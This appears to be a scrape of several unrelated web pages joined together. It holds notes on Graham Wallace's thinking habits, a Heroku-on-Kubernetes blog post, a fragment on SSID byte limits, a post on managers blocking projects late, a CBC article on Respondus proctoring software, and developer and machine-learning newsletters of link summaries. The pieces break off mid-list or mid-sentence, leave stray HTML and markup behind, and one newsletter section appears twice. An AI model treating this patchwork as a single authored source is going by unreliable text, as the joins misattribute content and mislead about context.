<em>“Daily repeated muscular action stimulates the memory of the thought-train”</em> - it might work to start your process by rereading what you wrote before.</li>
  <li>
<em>“Stimulus of breaking habit”</em> - he also warns that we should not become “slaves of our habits,” and he even suggests that in case you have used one of the habits described above for five days to change it with another one in the six-day.</li>
  <li>Start by working on <em>“what could be put off and leave till later what could not be put off”</em>. This allows you to focus on <em>“some question which, without a special effort of volition, we should be inclined to put off, a problem with slightly uncomfortable associations, or an inchoate train of still vague and only partially conscious thought”</em>
</li>
  <li>
<em>“Habit of watching the unfocussed fringe of their consciousness for any significant mental events which may appear there”</em>, should be accompanied by the habit of writing them down as they are without forcing yourself to give them a specific form or to elaborate them.</li>
  <li>
<em>“Habit of oral lecturing and seminar-teaching”</em> - where Wallace suggests that the ideas grow to each other when you are focusing on presenting them to an audience. You should go ahead and present to an audience (without reading from a paper) and be sure to note any ideas that might come into your mind during the presentation or afterward.</li>
</ol>

      </h3>

<p>It seems essential for an excellent thinker to keep track of different thoughts and ideas. Wallace suggests in this book some ways to handle this:</p>

<ul>
  <li>Write down ideas as they come, at the moment they arrive and in the form they come. Do not delegate for later the writing because you might lose them or forget them. Do not try to shape them, for you might interrupt a train of associations and loose some important though at the end.</li>
  <li>Once per week, reread these notes and try to connect them with your current work.</li>
  <li>If there is no connection with current work, then file the idea into a separate folder that Wallace names <em>“Redistribute”</em>, where you will put all these thoughts that seem important but do not belong elsewhere.</li>
  <li>From time to time, go through this folder and analyze what it is there.</li>
</ul>

                    <p><a href="https://heroku.com/">Heroku</a> sucks. Now before you jump out of your seat, hear me out. Heroku makes deploying applications dead simple. If you or a startup asked for a platform recommendation, I would pick Heroku in a heartbeat. Then what’s the problem? Well, Heroku <a href="https://www.heroku.com/pricing">pricing</a> sucks.</p><p>I love to tinker. I build apps to test product ideas weekly. But spending $7 per app to validate my ideas with Heroku is a huge turn off. Heroku has a free tier but your apps sleep after 30 minutes of inactivity depending on your remaining free dyno hours.</p><p>If an app took off then at minimum I will have a $100 monthly bill. Not to mention I would have to optimize for limited compute resources if I want to keep my bill low. There are other alternatives, but none of them have a comparable developer experience. Use their <a href="https://www.heroku.com/pricing">price estimator</a> if you don’t believe me.</p><p>The price debate always raises a question. Is it possible to save money by hosting my own Heroku-like platform? I can’t say for sure but I want to find out. Put simply, let’s tinker and flex those creativity muscles.</p><p>Today we kickoff the first post in a Heroku-on-Kubernetes series. Over the next few weeks I’ll document my journey as I explore how to build a Heroku platform on Kubernetes. I’ll share with you progress updates, system design plans, code snippets, and costs. </p><p>When I’m done, I’ll combine all these resources into a streamlined video you can watch to build your platform in a few hours. Then we’ll answer the question: can we save money by self-hosting Heroku?</p><p>Standups are a powerful tool for software development sprints. Let’s use the same format to track the development of our Heroku platform. </p><p><strong>What did you do yesterday or last session?</strong> Over the weekend I spent two hours working on a prototype to prove Heroku on Kubernetes platform is possible. Happy to report the prototype works. I built a <a href="https://cloud.google.com/kubernetes-engine">GKE</a> cluster using <a href="https://cloud.google.com/compute/vm-instance-pricing">preemptible e2-standard-4</a> worker nodes to save on prototyping costs. I installed <a href="https://knative.dev/">Knative</a> with <a href="https://istio.io/latest/">Istio</a> to configure a serverless container runtime. I deployed a sample application. I made a request to the application, and got a working response. Then, I tore down the infrastructure to save money until the next session. Last session cost me $0.31 on Google Cloud.</p><p><strong>What will you do next session?</strong> Next I plan to mockup the main user workflows. The workflows will mirror the Heroku developer experience. I’ll use <a href="https://www.figma.com/">Figma</a> since it's an easy to use design tool.</p><p><strong>What’s blocking you? </strong>No blockers.</p><p><strong>What questions do you have?</strong> I recently learned you can deploy <a href="https://linkerd.io/2020/03/23/serverless-service-mesh-with-knative-and-linkerd/">Knative with Ambassador and Linkerd</a>. (Thank you <a href="https://twitter.com/wm">William</a> for the <a href="https://twitter.com/wm/status/1277434336774504448?s=20">tip</a>!) I wonder if I should spend time testing this setup. I’m more familiar with these components which reduces the number of tools I would need to learn. However, the Ambassador integrations is in the alpha stage. I might run into undocumented issues. </p><p>I know what I will do, but what should I work on next?</p><p>Join the mailing list to stay updated with the series. Hope you’re excited about this project!</p>

This is not an actual technical requirements for SSIDs with the 2012 standard of 802.11 (Section 6.3.11.2.2) stating SSIDs simply have to be a max of 32 bytes. Once this script is ran you should be able to type anything less than 32 bytes. This tends to be at most 32 characters, but depending on the size of the Unicode characters used it can be much less. For instance the fire emoji, <code>🔥</code>, is actually 4 bytes because of how UTF-8 works. This means that only 8 fire emojis could be used.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the most frustrating and common experiences in the workplace is getting work blocked near the finish line. Examples:</p>
<ul>
  <li>A feature is developed over the course of 3 months. In the launch meeting a manager swoops in and declares it can’t be released for security reasons.</li>
  <li>You ask your manager for feedback on a proposal. They don’t respond. You ask again. They give a cursory glance and say “looks good”. A week later you say you’re ready to send it out. Suddenly they flood the document with feedback which ruins your timeline.</li>
  <li>An entire division works on a project for weeks. The minute they make it live the VP of the division storms in and yells “revert!”. The VP is displeased with the styling and insists it can’t be shipped that way.</li>
</ul>

<p>There’s usually one of 3 main causes for this anti-pattern:</p>
<ul>
  <li>Problem 1: Laziness/mis-calculation/ego. The stakeholder thinks it’s more efficient for them to engage with something closer to the finish line than early stage. This is often a gross mis-calculation. Projects are like cruise ships - you want to get to your destination with a lot of little steering along the way, not heroics after things have veered off course.</li>
  <li>Problem 2: Bad process. A critical stakeholder isn’t procedurally involved at the right time. If you find yourself blocking projects regularly, it’s your responsibility to fix this. <a href="https://staysaasy.com/process/2020/04/06/Creating-Good-Process.html">Create good process</a>.</li>
  <li>Problem 3: Micromanagement. The project/proposal didn’t actually need the manager’s feedback, they just can’t help having to put their stamp on everything.</li>
</ul>

<p>The solutions are simple but hard to master:</p>
<ul>
  <li>Answer 1: If you don’t think you need to be involved early, imagine the project goes live without your feedback at all. If you’re comfortable with that, you probably don’t need to be involved early (or at all). If you do need to give feedback, do it early and along the way.</li>
  <li>Answer 2: Make sure you have a process that involves necessary stakeholders at the right time.</li>
  <li>Answer 3: Don’t micromanage.</li>
</ul>

<p>If you mess up and find yourself giving major feedback near the finish line of a project, find ways to say yes and make sure you’re empathizing with the frustration that’s resulting from the late stage changes.</p>



<p>Some people actually take pride in blocking projects. Stakeholders who repeatedly view themselves as “saving the day” when it comes to tanking momentum and releases. They see themselves as a fountain of unique knowledge that prevent disasters.</p>

<p>This is almost always a result of incentives that are grossly mis-aligned. Some organizations have stakeholders who show up late in the game, who are not responsible for other teams being productive, who have 0 incentive to facilitate work and all the incentive to block things.</p>

<p>Companies should incentivize these stakeholders not only for preventing problematic releases, but also for the amount of things teams can get done to their requirements.  This ties their success to both risk management and enablement.</p>

"We're going to start eroding the expectation of privacy we have in our household by allowing certain monitoring practices to happen."</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5633147.1593541350!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/oliver-benning-student-university-of-ottawa.JPG 300w,https://i.cbc.ca/1.5633147.1593541350!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/oliver-benning-student-university-of-ottawa.JPG 460w,https://i.cbc.ca/1.5633147.1593541350!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/oliver-benning-student-university-of-ottawa.JPG 620w,https://i.cbc.ca/1.5633147.1593541350!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/oliver-benning-student-university-of-ottawa.JPG 780w,https://i.cbc.ca/1.5633147.1593541350!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/oliver-benning-student-university-of-ottawa.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5633147.1593541350!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/oliver-benning-student-university-of-ottawa.JPG"></p></div><figcaption>University of Ottawa fourth-year student Oliver Benning has started a petition asking the school to end its agreement with Respondus. <!-- --> <!-- -->(Supplied by Oliver Benning)</figcaption></figure></span></p>  <p>Benning, who said&nbsp;he's become a privacy advocate in recent years, started a petition calling on the university to immediately stop using Respondus&nbsp;products.</p>  <p>"I'm not saying the university shouldn't have any kind of academic integrity measures for student assessments," he said. "I just felt like it needs to be in the middle ground. This is just way too extreme."</p>  <h2>University conducting pilot&nbsp;</h2>  <p>In a June 25 memo to teaching staff in the University of Ottawa's faculty of social sciences, vice-dean of undergraduate studies Marc Molgat states that the university has recently acquired an online proctoring system through Respondus.</p>  <p>Despite that memo, in a written response, administrators wouldn't confirm to CBC that the university is using Respondus products, and would only confirm it's&nbsp;pilot testing some form of remote proctoring software.</p>  <p>"Rest assured that privacy and the protection of personal information will be of primary concern to us when assessing available tools. We will ensure to inform our community in due time," wrote Isabelle Mailloux Pulkinghorn, the university's media relations manager.</p>  <p>She added that students will be asked for their consent and professors will be free to choose if they use remote proctoring tools. If a student decides not to consent, their professor would then need to find an alternate way to evaluate them.&nbsp;</p>  <p>"At this point, there isn't much that we can add," said Mailloux Pulkinghorn.</p>  <p>However, the university's own technical support website for instructors and students contains several paragraphs explaining how Respondus Monitor records video and audio of a student during a test, then analyzes the student's actions, including eye movement.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/sarah-elaine-eaton.jpg 300w,https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/sarah-elaine-eaton.jpg 460w,https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/sarah-elaine-eaton.jpg 620w,https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/sarah-elaine-eaton.jpg 780w,https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/sarah-elaine-eaton.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/sarah-elaine-eaton.jpg"></p></div><figcaption>Sarah Elaine Eaton, an assistant professor at the University of Calgary, says post-secondary institutions are locked in an 'arms race' to procure remote proctoring technology designed to prevent cheating.<!-- --> <!-- -->(Supplied by Clayton MacGillvray)</figcaption></figure></span></p>  <p>In a statement to CBC Ottawa, Respondus CEO David Smetters wrote "the architecture for LockDown Browser and Respondus Monitor is designed with protection of student privacy as a basic requirement."</p>  <p>He compared students using&nbsp;webcams for an exam to taking part in&nbsp;a Zoom or Microsoft Teams session.</p>  <p>"It's up to the university to decide whether the benefit of using webcams for online learning outweighs the privacy concern raised by students."</p>  <h2>Equity also a concern</h2>  <p>Beyond the privacy concerns, experts in university cheating have also raised the issue of equity when it comes to requiring students to film themselves during exams.&nbsp;</p>  <p>University of Calgary assistant professor Sarah Elaine Eaton, whose area of research is academic integrity, says many universities have been scrambling to address a jump in cases of academic fraud since the start of the COVID-19 pandemic.&nbsp;</p>  <p>"Some of them have sort of gone to a great arms race to get an online proctoring tool that's available to them," said Eaton. "That presents a number of complexities for students, and that some students don't have the technology or they don't have access to a stable internet&nbsp;[connection]."</p>  <p>Eaton said she also worries remote proctoring software and other programs designed to catch cheaters are reducing the role teachers play in fighting academic fraud.&nbsp;</p>  <p>"I caution against turning to technology as a solution to complex ethical problems," she said. "We've seen over and over again that instructors still need to be part of the conversation."</p></span></p></div></div>]]>

<h3>What you missed in June as a Python Developer…</h3>
<hr>
<h3>Ultimate Python Debugging 🐛</h3>
<p>Nobody writes perfect code. Half the time, you are spending your time debugging your programs, so it is always a good time to invest in learning the proper way to debug your python code. Lucky for you, <a href="https://martinheinz.dev/blog/24" target="_blank" rel="nofollow">this article helps you out</a>.</p>
<p>While you are at it, also learn about <a href="https://www.blog.pythonlibrary.org/2020/06/17/python-101-exception-handling-2/" target="_blank" rel="nofollow">Python Error Handling</a>. </p>
<h3>A Free Python Course 🦄</h3>
<p>A pretty in depth <a href="https://dabeaz-course.github.io/practical-python/Notes/Contents" target="_blank" rel="nofollow">Python course</a> that tries to cover some of the basics of Python in written form. A productive little thing to do over the weekend or dive into a specific topic you are curious about.</p>
<h3>Dependency Management ⛲️</h3>
<p>Dependency management is a big topic for all programming languages. Python has one of the more complex dependency management out there, so it is no surprise that there are many ways of doing it. <a href="https://modelpredict.com/python-dependency-management-tools" target="_blank" rel="nofollow">Here is a breakdown</a> of the most common/best ways of going about this hard problem. </p>
<h3>The Best Flattener 🥌</h3>
<p><a href="https://chrisconlan.com/fastest-way-to-flatten-a-list-in-python/" target="_blank" rel="nofollow">I love articles like these</a> that don't necessarily make a HUGE impact in your programming ways, but do show you that there are many options out there for doing things. Remember, performance is only one of the factors in deciding what is <em>"good"</em> (i.e. think about readability too).</p>
<h3>How To Build A Large Project 🏄</h3>
<p>A great overview of potential ways to structure your Python Monorepos so that it scales well. It is not always about micro services, and sometimes Monorepos may be the answer for your large scale application. <a href="https://medium.com/opendoor-labs/our-python-monorepo-d34028f2b6fa" target="_blank" rel="nofollow">Have a read here</a>.</p>
<h3>Weekend Project Idea 🎏</h3>
<p><a href="https://www.linisnil.com/articles/scraping-roger-ebert-reviews-and-amazon/" target="_blank" rel="nofollow">This is a fun project</a> for you to build yourself this weekend using some Python Scraping <em>(pick your favourite movie critic)</em>. Bonus points if you make this into a web app or a voice skill for Alexa or Google Home.</p>
<p>Ok, just because I like you, <a href="https://blog.twitter.com/developer/en_us/topics/tips/2020/how-to-analyze-the-sentiment-of-your-own-tweets.html" target="_blank" rel="nofollow">here is another idea</a> in case you don't like the first one.</p>
<h3>What Are Enums? 📚</h3>
<p>Enum stands for enumeration and refers to a set of symbolic names, which are called enumeration members. Huh? They are essentially a data structure that can be very useful and an important one to add to your Python skills. So have a <a href="https://florian-dahlitz.de/blog/why-you-should-use-more-enums-in-python" target="_blank" rel="nofollow">read here</a> to learn all about them.</p>
<h3>Python Best Practice Bites 🥞</h3>
<p>A bunch of quick code snippets to demonstrate Python best practices that you can learn right away. <a href="https://livecodestream.dev/post/2020-06-08-make-your-code-great-python-style/" target="_blank" rel="nofollow">Enjoy</a>.</p>
<h3>Master NumPy 🤖</h3>
<p>NumPy is one of the most popular Python libraries that gets heavily used in the Machine Learning and Data Science space. [In this interactive tutorial],(<a href="https://mathtocode.com/" target="_blank" rel="nofollow">https://mathtocode.com/</a>) you get to learn all about NumPy by solving math problems <em>(it's a lot more fun than it sounds)</em>.</p>
<h3>PEP618 - zip() 🤐</h3>
<p>New PEP adds an optional length checker to the <code>zip()</code> function to avoid the common errors that you get when combining lists of different lengths. Have a read through the documentation <a href="https://www.python.org/dev/peps/pep-0618/#examples" target="_blank" rel="nofollow">here</a>.</p>
<h3>To Pickle or Not To Pickle 🥒</h3>
<p>Pickle is a very unique to Python. But should you always use it? In some cases, it may not be the best option, so you should be aware of these <a href="https://nedbatchelder.com/blog/202006/pickles_nine_flaws.html" target="_blank" rel="nofollow">9 flaws</a>.</p>
<h3>Github Is Taking Over 🗿</h3>
<p>Github's latest Actions <em>(ha! get it?)</em> have really shown the powerhouse that it is. Now, they announced <a href="https://github.blog/2020-06-18-introducing-github-super-linter-one-linter-to-rule-them-all/" target="_blank" rel="nofollow">Github Linter</a>. A Github super linter that will lint all your code with no need for you to build your own linting pipeline. Things are becoming better and better with Github and I don't see why we shouldn't be using all their tools in one place.</p>

I will be sharing the most important articles, podcasts and videos of the month.

<h3>History Of Search Engines 👾</h3>
<p>Nope...It isn't not just Yahoo, Bing and Google. <a href="https://carlhendy.com/history-of-search-engines/#top" target="_blank" rel="nofollow">This in-depth article</a> talks about the deep history of search engines and I guarantee there will be at least one thing in there that you didn't know <em>(I learned plenty when reading this)</em>. Enjoy!</p>
<h3>JetBrains Developer Survey 🗳</h3>
<p>My second favourite developer survey just released their results to show you what the developer market is doing. Python and JavaScript are still the champs. <a href="https://www.jetbrains.com/lp/devecosystem-2020/" target="_blank" rel="nofollow">Check it out for more insights</a>.</p>
<h3>Denofy 🗺️</h3>
<p>It's no secret that I am a <a href="https://academy.zerotomastery.io/p/deno-the-complete-guide-zero-to-mastery" target="_blank" rel="nofollow">big fan of Deno</a> and its future potential. <a href="https://github.com/garronej/denoify" target="_blank" rel="nofollow">Here is a great library</a> that takes Node modules and converts them to Deno so you can have all that community goodness in your Deno projects.</p>

<h3>MDN 💔 Angular</h3>
<p>Mozilla Developer Network which is the defacto place for all JavaScript documentation for the web has new sections on Frameworks and Libraries. <a href="https://developer.mozilla.org/en-US/docs/Learn/Tools_and_testing/Client-side_JavaScript_frameworks/React_getting_started" target="_blank" rel="nofollow">They have tutorials now on React, Vue and Ember</a>... but nothing for Angular...hmm wonder why?</p>
<p>But, whatever. Angular doesn't need them. <a href="https://blog.angular.io/version-10-of-angular-now-available-78960babd41" target="_blank" rel="nofollow">They just announced Angular 10</a>!</p>
<h3>Not Another Performance Article 🛸</h3>
<p>Ugh... ANOTHER performance article. But before you just brush this one off, it's actually a pretty good article showing you the process of analyzing performance and improving it beyond just doing super specific niche things for a measly 1% performance gain. <a href="https://3perf.com/blog/notion/" target="_blank" rel="nofollow">Actually recommend you read this</a>.</p>
<h3>Grid God/Godess 🏗</h3>
<p>Next time you want to present data inside of a grid/sheet style display on your website, there is no need to use anything else but this easy to use library. I wish I knew about this earlier: <a href="https://gridjs.io/" target="_blank" rel="nofollow">Grid.js</a></p>
<h3>Port Scanning Shenanigans  🔬</h3>
<p>Although <a href="https://blog.nem.ec/2020/05/24/ebay-port-scanning/" target="_blank" rel="nofollow">this is a security article</a>, it actually teaches you a useful skill of how to analyze obfuscated JavaScript on any website. Trust me, you will learn something new and interesting by reading this article.</p>
<p>PS. Here is a fun review of how to <a href="https://pixelprivacy.com/resources/how-to-encrypt-your-traffic/" target="_blank" rel="nofollow">encrypt your internet traffic</a> to stay safe out there. </p>
<h3>Relational VS Mongo 🌿</h3>
<p>The age old debate around Relational vs non Relational databases. HSBC just moved a bunch of their relational databases to MongoDB and Hackernews had a field day bashing them about it. <a href="https://news.ycombinator.com/item?id=23507197" target="_blank" rel="nofollow">A fun/educational read through the comments</a>. </p>
<p>If you want to geek out on latest Database advances, check out <a href="https://lucperkins.dev/blog/new-db-tech-1/" target="_blank" rel="nofollow">this article</a> for some of the exciting things happening in the space.</p>
<h3>JavaScript Project Ideas 🏟</h3>
<p>We recently released a new course in our online coding academy: <a href="https://academy.zerotomastery.io/p/javascript-projects" target="_blank" rel="nofollow">20 JavaScript projects to add to your portfolio</a> and sharpen your JS knowledge. </p>
<p>You should check it out. But if you don't want to, here is a <a href="https://music-grid.surge.sh/#0-0-0-16-0-0-0-0-64-0-40-0-256-128-512-1024-&amp;200" target="_blank" rel="nofollow">fun weekend project idea for you to build on your own</a>.</p>

...and this one: <a href="https://riccardoscalco.it/textures/" target="_blank" rel="nofollow">Textures.js</a></p>
<h3>Bootstrap 5 is here 🌪</h3>
<p>Bootstrap is still around and hanging on strong. Although it may not be "new and sexy" it is a library that is designed very well that makes you productive. They just came out with <a href="https://blog.getbootstrap.com/2020/06/16/bootstrap-5-alpha/" target="_blank" rel="nofollow">version 5</a>! I will be updating my <a href="https://academy.zerotomastery.io/p/complete-web-developer-zero-to-mastery" target="_blank" rel="nofollow">Web Development course</a> once it is out of alpha stages this year with this newer version. </p>
<h3>What Is DevOps? 🥁</h3>
<p>We keep hearing this term, but would you be able to explain it in just a few sentences? The short answer is that DevOps is more of an ideology than an actual role. However, <a href="https://stackoverflow.blog/2020/06/10/the-rise-of-the-devops-mindset/" target="_blank" rel="nofollow">this article</a> will break down its rise and what it all means much better than I can.</p>
<h3>How To Make Money on Github 🏦</h3>
<p>An interesting business model if you want to make money on Github and open source projects. Open source profitability is tough, but <a href="https://calebporzio.com/i-just-hit-dollar-100000yr-on-github-sponsors-heres-how-i-did-it" target="_blank" rel="nofollow">this person</a> seems to have found a way to do this successfully using the Github Sponsors model. Expect more of these stories to come out.</p>
<h3>Quick Web Accessibility 🔮</h3>
<p><a href="https://blog.segunolalive.com/posts/how-web-accessibility-works/" target="_blank" rel="nofollow">A nice short overview</a> of how Web accessibility works and some of the things you should be doing for best practices.</p>
<h3>Let's Talk TypeScript 🗝</h3>
<p>There is no question that TypeScript is a big part of the Web Development world now. In this article, we get to learn some of its history and where it is going. TypeScript really took off when Angular announced they would be using it for their project back in the day, and it hasn't stopped since. <a href="https://stackoverflow.blog/2020/06/15/talking-typescript-with-ryan-cavanaugh/" target="_blank" rel="nofollow">Enjoy some insights from this interview</a>.</p>
<h3>Github Is Taking Over 🗿</h3>
<p>Github's latest Actions <em>(ha! get it?)</em> have really shown the powerhouse that it is. Now, they announced <a href="https://github.blog/2020-06-18-introducing-github-super-linter-one-linter-to-rule-them-all/" target="_blank" rel="nofollow">Github Linter</a>. A Github super linter that will lint all your code with no need for you to build your own linting pipeline. Things are becoming better and better with Github and I don't see why we shouldn't be using all their tools in one place.</p>
<h3>Container History 🧱</h3>
<p><a href="https://blog.coinbase.com/container-technologies-at-coinbase-d4ae118dcb6c" target="_blank" rel="nofollow">This was a really interesting article from Coinbase</a>. They discuss the history of containers, where we came from, and the current landscape (i.e. Kubernetes). Even if you aren't working with these technologies directly, it's a great overview of the container landscape and some of the reasons you may need/not need Kubernetes.</p>
<h3>Refactor vs Rewrite 👹 👺</h3>
<p>Software is never perfect. With time, all code needs to be re-factored or re-written. But which options should you chose? <a href="https://remesh.blog/refactor-vs-rewrite-7b260e80277a" target="_blank" rel="nofollow">This article</a> does a great job talking about the tradeoffs and when the rare occasions are when you want to do a full rewrite.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>6th issue! If you missed them, you can <a href="https://zerotomastery.io/blog/?tag=MLM">read the previous issues of the Machine Learning Monthly newsletter here</a>.</strong></p>
<p>🤖<strong>Welcome to Machine Learning Monthly</strong>... one of the best ways to get started in the industry. The first part of this series is about solving problems in machine learning. The second part is about how to use machine learning to solve problems in machine learning. In this post, I'll introduce you to a number of new machine learning algorithms that I've been working on for the last year or so. I'll also cover some of the more common problems and techniques that you'll find as you learn about machine learning. I will also be discussing the various problems that you'll encounter in machine learning, and the ways that you can learn them in this series.</p>
<hr>
<p>Woah... The above paragraph was completely artificially generated. I fed a machine learning algorithm known as <a href="https://github.com/openai/gpt-2" target="_blank" rel="nofollow">GPT-2</a> (check out #2 below) the words "welcome to machine learning monthly" and it completed the rest. </p>
<p>Anyway, back to people generated words (I promise).</p>
<p>Hey everyone, Daniel here, I'm 50% of the instructors behind the <a href="https://academy.zerotomastery.io/p/complete-machine-learning-and-data-science-bootcamp-zero-to-mastery" target="_blank" rel="nofollow">Complete Machine Learning and Data Science: Zero to Mastery</a> course. </p>
<p>This is the sixth edition of Machine Learning Monthly. A 500ish word post detailing some of the most interesting things on machine learning I've found (or made) in the last month. </p>
<p>Let’s get into it.</p>

<h3>What you missed in June as a Machine Learning Engineer…</h3>
<hr>
<h2>My posts</h2>
<ul>
<li><a href="https://www.mrdbourke.com/how-can-a-beginner-data-scientist-like-me-gain-experience/" target="_blank" rel="nofollow">“How can a beginner data scientist like me gain experience?”</a> — Manuela emailed me this question and I replied with a few things I think you’ll find useful. The main one being: start the job before you have it.</li>
<li><a href="https://www.mrdbourke.com/how-i-got-tensorflow-developer-certified/" target="_blank" rel="nofollow">How I passed the TensorFlow developer certification (and how you can too)</a> — During May I set myself up with a curriculum to sharpen some of my TensorFlow skills. All with the goal of taking the <a href="https://www.tensorflow.org/certificate" target="_blank" rel="nofollow">TensorFlow developer certification</a> at the start of June. I took the exam and passed. So I put together an article (and video) of resources and techniques that I used to do it.</li>
</ul>
<h2>1. <a href="https://dbourke.link/mlmap" target="_blank" rel="nofollow">Machine Learning Roadmap 2020</a></h2>
<p>When starting out machine learning, it can be hard to connect the dots. From the different machine learning tools, to the process of working on a machine learning project, to the different kinds of evaluation metrics you need for each problem.</p>
<p>The <a href="https://dbourke.link/mlmap" target="_blank" rel="nofollow">Machine Learning Roadmap 2020</a> (actually a big interactive mind map) connects many of the most important concepts, as well as resources for learning more about each of them.</p>
<p>More specifically, it covers (broadly):</p>
<ol>
<li><strong>Machine learning problems</strong> — how to diagnose a machine learning problem.</li>
<li><strong>Machine learning process</strong> — once you’ve identified a machine learning problem, what steps can you take to solve it?</li>
<li><strong>Machine learning tools</strong> — what tools are available to you to solve the problem?</li>
<li><strong>Machine learning mathematics</strong> — since machine learning is largely using math to find patterns in numbers, what subfields of math are running under the hood of the machine learning algorithm you‘re calling?</li>
<li><strong>Machine learning resources</strong> — alright, so the above has sparked your curiosity, how do you learn these things? This part has you covered.</li>
</ol>
<p>I’m so excited for this. I think you’ll love it.</p>

<p>PS. Stay tuned for a full 2.5 hour video version coming soon which will premiere on the <a href="https://www.youtube.com/channel/UCt7T2EvYBqvlxNU3fbE4Y7g" target="_blank" rel="nofollow">Zero To Mastery Youtube Channel</a>. Subscribe now so that you don't miss it!</p>
<h2>2. <a href="https://github.com/minimaxir/aitextgen" target="_blank" rel="nofollow">aitextgen</a> — Leverage OpenAI's GPT-2 architecture to generate text</h2>
<p>I spent an hour or so playing around with this. You can get up and running in under 5-minutes on Google Colab (just follow the instructions in the GitHub repo). </p>
<p>Max Woolf makes some really cool things and this might be my favourite yet.</p>
<p>Out of the box, <a href="https://github.com/minimaxir/aitextgen" target="_blank" rel="nofollow">aitextgen</a> leverages OpenAI's 124M parameter version of GPT-2 (for context, the biggest one available is 1.5B parameters) to take in a seed, such as, "welcome to machine learning monthly" and then it artificially generates text up to your desired length (using the max_length parameter).</p>
<p>You can even train the model on your own text to generate something flavoured with your style (perhaps it could read all of your old blog posts and generate a new one for you?).</p>
<p>As text generation gets better and better, it'll be an interesting time when you could effectively run a social media account with purely AI-generated text.</p>
<h2>3. <a href="https://magenta.tensorflow.org/coconet" target="_blank" rel="nofollow">Using AI to play like Bach</a></h2>
<p>As if generating text with AI wasn't enough to fuel your artistic dreams. How about using AI to generate music in the style of Bach (a famous German composer)?</p>
<p>Last year, Google did just that with their <a href="https://www.google.com/doodles/celebrating-johann-sebastian-bach" target="_blank" rel="nofollow">Google Doodle</a>. They trained a machine learning model (called Coconet) on 306 of Bach's compositions and created an interactive demo where you can enter your own music notes and have them artificially harmonized (turned into something that sounds pretty good).</p>
<p>I'm liking this theme. </p>
<p>AI generated art is definitely becoming a thing. If you never fancied yourself a musician but you can code, now you can write code to play the music for you.</p>
<p>The <a href="https://magenta.tensorflow.org/coconet" target="_blank" rel="nofollow">blog post that went along with</a> it is also truly worth the read.</p>
<h2>4. <a href="https://dfrieds.com/articles/data-science-reality-vs-expectations.html" target="_blank" rel="nofollow">Data science: expectations vs. reality</a></h2>
<p>Dan Friedman attended a 12-week data science bootcamp in 2016, during which ML &amp; AI was everywhere in the news. However, after some experience in the field, he found his expectations didn't meet reality.</p>
<p>In particular, some takeaways include:</p>
<ul>
<li>People don't know what "data science" does (it's more than just running machine learning algorithms)</li>
<li>Most ML projects don't make it into production</li>
<li>Data &amp; data infrastructure tools are lacking (data in industry is different to data you find in books &amp; Kaggle competitions)</li>
</ul>
<p>The last two are very real. Building a model these days is becoming very approachable, however, getting it into people's hands is the real challenge.</p>
<p>Enter, MLOps.</p>
<h2>5. <a href="https://huyenchip.com/2020/06/22/mlops.html" target="_blank" rel="nofollow">What the hell is MLOps anyway?</a></h2>
<p>So you want to get your machine learning model out into the world?</p>
<p>Well then, you'll probably want to familiarize yourself with MLOps (short for machine learning operations). If you're familiar with DevOps, MLOps is the same but with machine learning thrown in the mix.</p>
<p>In essence, MLOps is all the things you need around your machine learning model so users can interact with it.</p>
<p>It's a combination of: a data pipeline (a way to collect and prepare data), a machine learning model (the fun part) and a way to serve that machine learning model (a web or mobile application or API).</p>
<p>A few years ago, deploying a machine learning model was like black magic. Some (outside of large tech companies) had heard of it and even less had done it.</p>
<p>Now though, the tools in the space of getting your machine learning creation to the world are growing and the good thing is, <a href="https://huyenchip.com/2020/06/22/mlops.html" target="_blank" rel="nofollow">Chip Huyen has written a fantastic blog post</a> reflecting on what she learned by going through 200+ (yes, two-hundred plus) of them.</p>
<p>Check it out and use what you learn to get your machine learning models in the hands of people around the world.</p>
<h2>6. <a href="https://hanlab.mit.edu/projects/ofa/" target="_blank" rel="nofollow">One neural network to rule them all!</a></h2>
<p>(not really, just a really cool way to train a single neural network and have it be optimised for multiple device types).</p>
<p>This is actually a really important piece of research.</p>
<p>Usually, to have the same machine learning model deployed across multiple device types (think smartphone, desktop PC and microcontroller), you'd need to train a separate model for each one.</p>
<p>This practice of training a separate machine learning model for each device type, especially when they're all learning similar things, turns out to be incredibly wasteful (perhaps surprisingly, computing power doesn't magically grow on trees, it burns carbon and releases emission).</p>
<p>Not anymore. The <a href="https://ofa.mit.edu/" target="_blank" rel="nofollow">once for all network (codenamed OFA)</a> is a training paradigm which allows you to train a neural network once and have it automatically adapt itself (during training) for different devices.</p>
<p>The explanation the researchers give is worth reading itself, let alone the outstanding work they've created.</p>
<h2>7.  <a href="https://explained.ai/matrix-calculus/index.html" target="_blank" rel="nofollow">All of the matrix calculus you need for deep learning</a></h2>
<p>Jeremy Howard (the creator of fast.ai) decided he needed to know more about the matrix calculus which works under the hood of deep learning.</p>
<p>So he and his colleague Terence Parr wrote a book about it.</p>
<p>That's the trick. If you want to know something about something, write a book about it.</p>
<p>And if you want to brush up your matrix calculus (and your deep learning from scratch skills), <a href="https://explained.ai/matrix-calculus/index.html" target="_blank" rel="nofollow">The Matrix Calculus You Need For Deep Learning book</a> is for you.</p>
